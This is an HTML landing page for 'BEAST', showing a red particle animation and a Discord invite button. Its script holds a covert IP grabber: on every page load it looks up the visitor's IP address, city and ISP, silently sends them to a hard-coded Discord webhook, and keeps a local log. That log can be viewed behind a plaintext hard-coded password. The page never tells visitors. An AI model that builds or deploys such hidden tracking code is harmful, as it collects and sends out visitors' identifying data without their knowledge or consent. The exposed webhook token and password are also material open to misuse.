<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BEAST // DEV</title>
    <style>
        :root { --main-red: #ff0000; --dark-bg: #050505; }
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: var(--dark-bg); color: white;
            font-family: 'Courier New', monospace; overflow: hidden;
        }

        #bg-canvas { position: absolute; top: 0; left: 0; z-index: 1; display: block; }

        /* THE GEAR - Absolute Top Layer */
        .vault-trigger {
            position: fixed; top: 20px; right: 20px; width: 60px; height: 60px;
            background: rgba(255, 0, 0, 0.1); border: 2px solid var(--main-red);
            z-index: 999999; cursor: pointer; display: flex; align-items: center; 
            justify-content: center; pointer-events: all;
        }

        /* SCREEN VIEWS */
        .content-layer { position: relative; z-index: 10; width: 100%; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #vault-screen { display: none; background: rgba(0,0,0,0.95); overflow-y: auto; padding: 20px; justify-content: flex-start; }

        .glitch-title { font-size: 5rem; font-weight: 900; letter-spacing: 15px; margin: 0; color: white; text-shadow: 0 0 20px red; }
        .btn { border: 2px solid red; padding: 15px 30px; color: white; text-decoration: none; margin-top: 50px; background: rgba(255,0,0,0.1); }

        /* LOG TABLE */
        .log-container { width: 90%; margin-top: 30px; border: 1px solid #333; }
        .log-entry { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #222; font-size: 12px; color: #0f0; }
        .log-header { background: #111; color: red; font-weight: bold; }
    </style>
</head>
<body>
    <canvas id="bg-canvas"></canvas>

    <div class="vault-trigger" onclick="handleVaultClick()">
        <span style="font-size: 30px;">⚙️</span>
    </div>

    <div id="home-screen" class="content-layer">
        <h1 class="glitch-title">BEAST</h1>
        <p>// DATA_STRUCTURE_SHADOWS</p>
        <a href="https://discord.gg/YbTCmRvhsG" class="btn" target="_blank">JOIN SERVER</a>
    </div>

    <div id="vault-screen" class="content-layer">
        <button onclick="location.reload()" style="background:none; border:1px solid white; color:white; cursor:pointer; padding:5px 15px; align-self:flex-start;">[ EXIT_TERMINAL ]</button>
        <h2 style="color:red; margin-top:20px;">SYSTEM_OVERSIGHT_LOGS</h2>
        <div class="log-container" id="log-list">
            <div class="log-entry log-header">
                <span>TIMESTAMP</span><span>IP_ADDRESS</span><span>LOCATION</span><span>ISP</span>
            </div>
            </div>
    </div>

    <script>
        // BACKGROUND
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function init() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            for (let i = 0; i < 50; i++) { particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, s: Math.random() * 1 + 0.5 }); }
        }
        function animate() {
            ctx.fillStyle = 'rgba(5, 5, 5, 0.2)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.y -= p.s; if (p.y < 0) p.y = canvas.height;
                ctx.fillStyle = 'red'; ctx.beginPath(); ctx.arc(p.x, p.y, 1, 0, Math.PI * 2); ctx.fill();
            });
            requestAnimationFrame(animate);
        }
        init(); animate();

        // THE AUTO-LOGGER
        (async function() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // 1. Local Memory Log
                let logs = JSON.parse(localStorage.getItem('beast_intel') || "[]");
                logs.unshift({
                    t: new Date().toLocaleTimeString(),
                    ip: data.ip,
                    loc: `${data.city}, ${data.country_code}`,
                    org: data.org
                });
                localStorage.setItem('beast_intel', JSON.stringify(logs.slice(0, 50)));

                // 2. Discord Webhook
                fetch("https://discord.com/api/webhooks/1479941914655461507/U_QqJ1Z3by3Ian75CwqbCD3D5DU5K8zDdOooPxCjJrTaTp9ws6iLZ-tjB8GGGMvdQ4nY", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `📍 **New Entry:** ${data.ip} - ${data.city} (${data.org})` })
                });
            } catch(e) {}
        })();

        // VAULT TRIGGER
        function handleVaultClick() {
            const pass = "adorn123xbeast123xdontguesspass";
            const attempt = prompt("ENTER ACCESS KEY:");

            if (attempt === pass) {
                document.getElementById('home-screen').style.display = 'none';
                document.getElementById('vault-screen').style.display = 'flex';
                
                const list = document.getElementById('log-list');
                const logs = JSON.parse(localStorage.getItem('beast_intel') || "[]");
                
                logs.forEach(l => {
                    list.innerHTML += `
                        <div class="log-entry">
                            <span>${l.t}</span><span style="color:white">${l.ip}</span><span>${l.loc}</span><span style="font-size:10px">${l.org}</span>
                        </div>`;
                });
            } else if (attempt) {
                alert("ACCESS DENIED.");
            }
        }
    </script>
</body>
</html>
